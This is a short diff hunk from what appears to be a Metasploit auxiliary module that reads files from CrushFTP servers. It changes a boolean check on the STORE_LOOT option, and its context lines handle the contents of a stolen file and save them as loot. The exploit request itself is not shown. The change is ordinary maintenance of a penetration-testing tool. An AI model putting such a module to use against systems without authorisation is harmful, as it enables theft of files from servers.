@@ -119,7 +119,7 @@ class MetasploitModule < Msf::Auxiliary
     file_data = res_steal_file.body[res_steal_file.body.index(file_begin_tag) + file_begin_tag.length..]
     file_data = file_data.split(file_end_tag)[0]
 
-    if datastore['STORE_LOOT'] == true
+    if datastore['STORE_LOOT']
       print_good('Storing the file data to loot...')
       store_loot(File.basename(file_name), 'text/plain', datastore['RHOST'], file_data, file_name, 'File read from CrushFTP server')
     else
